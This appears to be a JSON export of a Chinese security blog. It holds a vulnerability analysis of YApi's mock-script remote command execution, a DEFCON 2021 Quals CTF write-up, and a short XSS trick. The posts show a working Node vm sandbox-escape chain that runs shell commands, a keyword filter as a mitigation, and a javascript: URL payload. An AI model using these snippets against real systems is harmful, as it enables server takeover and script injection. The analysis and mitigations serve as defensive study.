[{"title":"Yapi 远程命令执行漏洞分析","url":"https://0727.site/Yapi 远程命令执行漏洞分析/","content":"文章首发于 paper.seebug.org。\n0x01 简述Yapi 是高效、易用、功能强大的 api 管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。可以帮助开发者轻松创建、发布、维护 API，YApi 还为用户提供了优秀的交互体验，开发人员只需利用平台提供的接口数据写入工具以及简单的点击操作就可以实现接口的管理。\n2021年7月8日，有用户在 GitHub 上发布了遭受攻击的相关信息。攻击者通过注册用户，并使用 Mock 功能实现远程命令执行。命令执行的原理是 Node.js 通过 require(&#39;vm&#39;) 来构建沙箱环境，而攻击者可以通过原型链改变沙箱环境运行的上下文，从而达到沙箱逃逸的效果。通过 vm.runInNewContext(&quot;this.constructor.constructor(&#39;return process&#39;)()&quot;) 即可获得一个 process 对象。\n影响版本Yapi &lt;= 1.9.2 \n0x02 复现复现环境为 Yapi 1.9.2，Docker 环境已上传到 Dokcer Hub。\n攻击者通过注册功能注册一个新用户，在新建项目页面创建一个新项目。\n\n在设置 -&gt; 全局 mock 脚本中添加恶意代码。设置命令为反弹 shell 到远程服务器。\n\nPOC如下：\n\n随后添加接口，访问提供的 mock 地址。\n\n随后即可在远程服务器上收到来自命令执行反弹的 shell。\n\n0x03 漏洞分析在 Github 上发布的新版本 1.9.3 已经修复了这个漏洞。https://github.com/YMFE/yapi/commit/37f7e55a07ca1c236cff6b0f0b00e6ec5063c58e\n核心问题在server/utils/commons.js line 635\n\n修复后的代码引入了新的动态脚本执行模块 safeity，替换了原有的 vm 模块。根据 Node.js 官方的描述\n\n The vm module is not a security mechanism. Do not use it to run untrusted code.\n\nvm 模块并不是一个完全安全的动态脚本执行模块。先来看看 vm 有哪些执行命令的函数。\n\n根据官方文档，这三个函数都有一个参数 contextObject 用来表示上下文。但是这个上下文并不是完全隔离地运行的，可以通过原型链的形式实现沙箱逃逸。\n> vm.runInNewContext(\"this\")\n&#123;&#125; // this 是一个空对象\n\n> vm.runInNewContext(\"this.constructor\")\n[Function: Object] // 通过 this.constructor 可以获得一个对象的构造方法\n\n> vm.runInNewContext(\"this.constructor('a')\")\n[String: 'a'] // 获得了一个字符串对象\n\n> vm.runInNewContext(\"this.constructor.constructor('return process')\")\n[Function: anonymous] // 获得了一个匿名函数 function() &#123; return process; &#125;\n\n> vm.runInNewContext(\"this.constructor.constructor('return process')()\")\nprocess &#123;\n  title: 'node',\n  version: 'v10.19.0',\n  ...\n&#125; // 获得了一个 process() 函数的执行结果\n  // 接下来就可以通过 process.mainModule.require('chile_process').execSync('command') 来执行任意代码\n\n有一种防护方案是将上下文对象的原型链赋值成 null，就可以防止利用 this.constructor 进行沙盒逃逸。const contextObject = Object.create(null)，但是这种方法有个缺点，这样禁用了内置的函数，业务需求完全得不到实现。有文章Node.js沙盒逃逸分析提到可以用 vm.runInNewContext(&#39;&quot;a&quot;.constructor.constructor(&quot;return process&quot;)().exit()&#39;, ctx);绕过原型链为 null 的限制。测试后发现无效，如果不考虑业务需求的话，Object.create(null)应该是一种终极的解决方案了。\n接下来我们可以下断点跟进看看漏洞是如何被利用的。在server/utils/commons.js line 635处下断点，构造 mock 脚本，然后访问 mock 接口，程序运行停止在断点处。使用 F11 Step into 进入server/utils/conmmons.js处，单步调试至line 289，再用 F11 进入沙盒环境。\nconst sandbox = this // 将沙盒赋给了变量 sandbox\nconst process = this.constructor.constructor('return process')() // 利用原型链进行沙盒逃逸获得 process 对象\nmockJson = process.mainModule.require('child_process').execSync('whoami &amp;&amp; ps -ef').toString() // 给 sandbox.mockJson 赋值了命令执行的结果\n函数执行结束后会调用 context.mockJson = sandbox.mockJson 并将 mockJson 作为 req.body 返回用户，于是就可以在页面中看到命令执行的反馈。\n0x04 防护方案1、在 Mock 功能中加入对恶意代码的过滤。找到文件 api/common/postmanLib.js 的第178行，在函数 function sandboxByNode(sandbox = &#123;&#125;, script) 的开始添加一段过滤： const filter = &#39;process|exec|require&#39;; const reg = new RegExp(&quot;[&quot;+filter+&quot;]&quot;, &quot;g&quot;); if(reg.test(script)) &#123; return false; &#125;\n2、如果没有使用注册的需求，建议关闭 Yapi 的注册功能。通过修改 Yapi 项目目录下的 config.json 文件，将 closeRegister 字段修改为 true 并重启服务即可。\n3、如果没有 Mock 功能的需求，建议关闭 Yapi 的 Mock 功能。\n0x05 相关链接1、高级Mock可以获取到系统操作权限2、Node.js命令执行和沙箱安全3、Node.js沙盒逃逸分析\n","categories":["JavaScript","De-Obfuscation"],"tags":["漏洞分析"]},{"title":"DEFCON2021 Quals threefactooorx","url":"https://0727.site/DEFCON Quals 2021 threefactooorx/","content":"反混淆插件源码的主要部分在 content_script.js， 但因为经过混淆，根本不是给人看的，于是得先反混淆。考虑到 js 本身就是解释型语言，我可以直接在 chrome devtools 中下断点，然后在 console 里打印我想要的变量值。最外层的函数不是特别多，所以依次下断点配合 devtools 的控制台获取变量。\n这段过程都是体力活，就不具体描述了，最后反混淆出了大致能看的 js 代码 readable_code.js。\n最后看下来，反混淆的部分是最重要的，因为后面的分析都不是很难。\n本地分析反混淆以后，可以看到在源码的最后有一段代码会定时向后台获取 flag 并输出。\nobserver[\"observe\"](document, config),\n    console[\"log\"](\"The observer is observing.\"),\n    setTimeout(function() &#123;\n      const _0xd26915 = &#123;&#125;;\n      _0xd26915[\"getflag\"] = _0x10b2d5[\"xOsuT\"], //true\n          chrome[\"runtime\"][\"sendMessage\"](_0xd26915, function(_0x336e82) &#123;\n            // _0x336382 is response from backend included with flag\n            FLAG = _0x336e82[\"flag\"],\n                console['log']((\"flag: \" + _0x336e82[\"flag\"]));\n\n            // four &amp;&amp; and display flag on the #thirdfactooor\n            nodesadded == 5 &amp;&amp; (nodesdeleted == 3) &amp;&amp; \\\n            attrcharsadded == 23 &amp;&amp; (domvalue == 2188) &amp;&amp; \\\n             (document[\"getElementById\"](\"thirdfactooor\")['value'] = _0x336e82[\"flag\"]);\n\n            // append new div\n            const _0x369bcb = document[\"createElement\"](\"div\");\n            _0x369bcb[\"setAttribute\"](\"id\", \"processed\"),\n                document[\"body\"][\"appendChild\"](_0x369bcb);\n          &#125;);\n    &#125;, 500);\n\n其中这个 document[&quot;getElementById&quot;](&quot;thirdfactooor&quot;) 是在 check_dom() 会进行的一项检查，我们需要让 html 中有一个 id 为 thirdfactooor 的 input 标签。\nif (document[\"querySelector\"](\"thirdfactooor\")[\"tagName\"] == \"INPUT\") &#123;&#125;\n\n只需要满足\nnodesadded == 5 &amp;&amp; (nodesdeleted == 3) &amp;&amp; attrcharsadded == 23 &amp;&amp; (domvalue == 2188)\n\n依次找到赋值的地方\n/*\n > _0x8a010b instanceof MutationRecord\n &lt;· true\n*/\nif (_0x8a010b[\"type\"] === \"childList\") &#123;\n    if (false) &#123;\n        // never execute\n    &#125; else &#123;\n        nodesadded += _0x8a010b[\"addedNodes\"][\"length\"],\n        nodesdeleted += _0x8a010b[\"removedNodes\"][\"length\"];\n    &#125;\n&#125; else &#123;\n    if ((_0x8a010b[\"type\"] === \"attributes\")) &#123;\n        if (true) &#123;\n            attrcharsadded += _0x8a010b[\"attributeName\"][\"length\"];\n        &#125;\n    &#125;\n&#125;\n在这里学习了一下 MutationRecode 的函数，MutationRecord JavaScript API。 type 会随着不同的操作改变\n\n改变 Node.childNodes 时会变成 childList\n改变  Element.attribute 时会变成 attributes\n\n按要求我们需要5次节点增加，3次节点移除，改变的属性名的长度总和为23。\n需要注意的是，在这段赋值操作前，有一处判断会导致程序提前退出。\nvar _0x5b12b9 = document[\"getElementById\"](\"3fa\");\n...\nif ((_0x8a010b[\"target\"] === _0x5b12b9) || \\\n_0x8a010b[\"target\"][\"parentNode\"] === _0x5b12b9 || \\\n_0x8a010b[\"target\"][\"parentNode\"][\"parentNode\"] === _0x5b12b9) &#123;&#125;\nelse return;\n\n所以 id 为 #3fa 的节点必须是根节点（可以直接给 &lt;html&gt; ）。\n接下来在调试的时候观察到 domvalue 与 .html 文件中的字数有关，凑足一定的字数即可。\n&lt;input id=\"thirdfactooor\" size=\"1000px\">\n&lt;script>\n    let fa = document.getElementsByTagName(\"html\")[0];\n    fa.setAttribute(\"id\", \"3fa\")\n    for(let i = 0; i &lt; 4; i++) &#123;\n        fa.lang = i; // 2 + 4 chars * 4 + 5\n    &#125;\n    let a = document.createElement(\"div\")\n    let b = document.createElement(\"div\")\n    let c = document.createElement(\"div\")\n    let d = document.createElement(\"div\")\n    let e = document.createElement(\"div\")\n    fa.appendChild(a)\n    fa.appendChild(b)\n    fa.appendChild(c)\n    fa.appendChild(d)\n    fa.appendChild(e)\n    fa.removeChild(a)\n    fa.removeChild(b)\n    fa.removeChild(c);\n    console.log(\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\")\n&lt;/script>\n\n直接放在本地跑，成功\n\nCapture the flag远程服务提供了一个 /submit 接口，可以提交我们的 html 文件，然后会用类似给这个 html “拍照”的方式，以图片格式返回。期间， html 文件里的 js 代码都会执行，但是 alert() 会引起报错，基本排除了 XSS 的可能。直接上传，DONE!\n\n\n总结第一次解出国际赛的题目，当能 getflag 的时候手都在抖。总体过程还是反混淆最折磨人，代码的逻辑并不复杂，getflag 也不需要绕太多的弯，只要能把 js 恢复出来就成功了大半。\n","categories":["JavaScript","De-Obfuscation"],"tags":["DEFCON 2021 Quals","Writeup"]},{"title":"JS trick in XSS","url":"https://0727.site/JS trick in XSS/","content":"xss = \"javascript:alert(1)\";\n(&#123; xss: location &#125; = this);\n\n这里要提到解构赋值的概念，\n利用解构赋值，将属性/值从对象/数组中取出，并赋值给其他变量这里的圆括号是必须的\n\n于是我将问题提炼，问 kevin：(&#123;a:location&#125;=aa)为什么会使页面跳转？\n然后达成一致，是因为location的值发生了变化，然后浏览器强制刷新了。但我们关注到跳转后的页面后接的路由是根据a的值来的，有可能会出现/undefined的情况。\n然后这里我和 kevin 持两种不同的意见：\n我认为这里是因为首先根据&#123;a:location&#125;=this,把当前页面(this)的location赋值过去，然后根据a的值进行跳转。\nkevin 认为首先将this.a的值赋给了a.location，原因是a这个Object和window这个Object里都有a这个键。然后触发了解构赋值，a.location=this.a=&#39;javascript:alert(1)&#39;，最后成功触发了xss。\n关于poc可以看\n\n执行后的结果为：\n\n","categories":["JavaScript","XSS"],"tags":[]},{"title":"Start from scratch","url":"https://0727.site/Start from scratch/","content":"now I want a new start\n","categories":[],"tags":[]}]